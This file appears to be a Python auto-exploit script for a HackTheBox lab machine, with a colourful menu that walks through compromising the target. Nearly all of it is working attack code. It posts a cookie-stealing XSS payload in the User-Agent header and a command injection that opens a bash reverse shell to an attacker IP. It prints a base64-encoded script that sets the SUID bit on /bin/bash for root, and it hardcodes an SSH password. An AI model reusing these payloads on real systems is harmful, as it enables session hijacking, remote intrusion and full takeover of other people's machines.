import sys, os
import time as cm
import requests
import subprocess
import paramiko
from threading import Thread
import time as cm
from colorama import Fore, init
from consolemenu import SelectionMenu

init(autoreset=True)

def banner():
    os.system("clear")
    bnn = """
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢿⣧⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣶⡀⠀⠀⢀⡴⠛⠁⠀⠘⣿⡄⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣷⣤⡴⠋⠀⠀⠀⠀⠀⢿⣇⠀         ▓█████ ▄████▄   ██░ ██  ██ ▄█▀                       █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⣿⠀         ▓█   ▀▒██▀ ▀█  ▓██░ ██▒ ██▄█▒                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠈⣿⡀         ▒███  ▒▓█    ▄ ▒██▀▀██░▓███▄░                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢏⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⡇         ▒▓█  ▄▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣷⣾⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢿⡇         ░▒████▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄                       █
                  ⠀⠀⠀⠀⠀⠀⠀⢀⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⢸⡇         ░░ ▒░ ░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒                       █
                  ⠀⠀⠀⠀⠀⠀⢠⡞⠁⢹⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⠀          ░ ░  ░ ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░                       █
                  ⠀⠀⠀⠀⠀⣠⠟⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⢸⠀          ░  ░         ░  ░░ ░░ ░░ ░                          █
                  ⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⠀⣴⠋⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀          ___ ___ ___ ___                                     █
                  ⢀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀         (___|___|___|___)                                    █
                  ⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀         G1thub: https://github.com/l44x                      █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀         T4skT00l: Pw3ned-R00t [ LinkVortex ]                 █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀    ___ ___ ___ ___                                           █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀   (___|___|___|___)                                          █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠃                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                              █
                  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    """
    print(Fore.RED + f"{bnn}")
    
global machine_ip
global target_machine

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.8"

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(Fore.RED + f"\n\t\t~ [HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
            print(Fore.LIGHTWHITE_EX + f"\t\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n")
        else:
            print(Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [Vpn-Status] {e}")

def user_default_hackthebox():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ') # if hackthebox change ip, change this parameter.
        #machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
        print("----------------------------------------------------")
        print(Fore.CYAN + f"\t\t ~ [Default User Connection]")
        print(Fore.RED + f"\n\t\t\t\t [HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(Fore.RED + f"\t\t\t\t\t[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(Fore.RED + f"\t\t\t\t\t[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(Fore.RED + f"\t\t\t\t\t[Target Path Exploit] > " + Fore.YELLOW + f"http://10.10.11.8:5000/support")
        else:
            print(Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Headless Network")
        print("----------------------------------------------------\n")
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")



def post_get_cokkie_dvir():
    
    url="http://10.10.11.8:5000/support"
    s = requests.Session()
    
    header={
        'User-Agent': f'<script>document.location="http://{machine_ip}/?cookie="+document.cookie</script>',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5', 
        'Accept-Encoding': 'gzip, deflate, br',
    }
    
    data='fname=<script>alert(1)</script>&lname=<script>alert(1)</script>&email=data@gmail.com&phone=<script>alert(1)</script>&message=<script>alert(1)</script>'
    
    r = s.post(url=url,data=data,headers=header)



def get_user_dvir_shell():
    
    url="http://10.10.11.8:5000/dashboard"
    s = requests.Session()
    
    cokkie=input(Fore.GREEN+"\t\t\t\t\t[Exploit Message] "+Fore.YELLOW + f"Enter the cokkie admin session > ")
    header={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5', 
        'Accept-Encoding': 'gzip, deflate, br',
        'Cookie': f'is_admin={cokkie}'
    }
    
    input(Fore.GREEN+"\t\t\t\t\t[Exploit Message] "+Fore.YELLOW + f"Press enter if u listen on port 9001...")
    data=f"date=; bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.3/9001+0>%261'"
    
    r = s.post(url=url,data=data,headers=header)

def unlocked():
    try:
        checker_status()
        user_default_hackthebox()
        
        # Menu seleccionar usuario a conectarse.
        while True:
            users=["dvir cokkie", "dvir user", "root", "exit"]
            client = paramiko.SSHClient()
            host = target_machine
            username = "bob"
            password = "fibber-talented-worth"
            print("----------------------------------------------------")
            print(Fore.MAGENTA + f"\t\t ~ [M3NU 0PT1ONS S3L3CT10N]\n")
            for index,user in enumerate(users):
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Menu Options] > " + Fore.GREEN + f"{index+1} > {user}")
            
            print(Fore.LIGHTYELLOW_EX+f"\t\t\t\t\t/----------------------------/")
            user_call= int(input(f"\t\t\t\t\t ~ What ur user select? > "))
            print("----------------------------------------------------\n")

            if user_call == 1:
                try:
                    print("----------------------------------------------------")
                    print(Fore.CYAN + f"\t\t ~ [Connection to dvir-cokkie :)]\n")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Path] > " + Fore.GREEN + f"http://10.10.11.8:5000/support")
                    print(Fore.RED + f"\t\t\t\t\t[Target Repository] > " + Fore.YELLOW + f"Listening to http.server")
                    input(Fore.RED + f"\t\t\t\t\t[Exploit - Message] > " + Fore.YELLOW + f"Press enter if u listen...")
                    print(Fore.GREEN + f"\t\t\t\t\t[Exploit - Message] > " + Fore.LIGHTCYAN_EX + f"Wait for recv the cokkie of admin :3")
                    cm.sleep(.5)
                    post_get_cokkie_dvir()
                    print("----------------------------------------------------\n")
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
                    

            if user_call == 2:
                try:
                    print("----------------------------------------------------")
                    print(Fore.CYAN + f"\t\t ~ [Connection to dvir :)]\n")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Path] > " + Fore.GREEN + f"http://10.10.11.8:5000/dashboard")
                    cm.sleep(.5)
                    get_user_dvir_shell()
                    print("----------------------------------------------------\n")
                    break
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break

            elif user_call == 3:
                try:
                    print("----------------------------------------------------")
                    print(Fore.CYAN + f"\t\t ~ [Connection to root :)]\n")
                    cm.sleep(.5)
                    print(Fore.GREEN + f"\t\t\t\t\t[Exploit - Message] > " + Fore.LIGHTCYAN_EX + f"Enter this command and execute.")
                    print(Fore.GREEN + f"\t\t\t\t\t[Exploit - Command] > " + Fore.LIGHTWHITE_EX + f"""echo "IyEvYmluL2Jhc2gKCmNkIC90bXAvcnVzdF9tb3pwcm9maWxlRjVLa0JqCnRvdWNoIGluaXRkYi5z
aApjaG1vZCAreCBpbml0ZGIuc2gKCmVjaG8gIiMhL2Jpbi9iYXNoCgpjaG1vZCB1K3MgL2Jpbi9i
YXNoIiA+IGluaXRkYi5zaAoKc3VkbyAvdXNyL2Jpbi9zeXNjaGVjawoKYmFzaCAtcAo=" | base64 -d > root.sh """)
                    print(Fore.GREEN + f"\t\t\t\t\t[Exploit - Message] > " + Fore.YELLOW + f"G00dR00t Pwned :3")
                    print("----------------------------------------------------\n")
                    break
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
            
            elif user_call == 4:
                    break
            else:
                break
            
            
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [root-user] {e}")

if __name__ == '__main__':
    banner()
    unlocked()
    
    #t1 = Thread(target=resolve_form)
    #t1.run()
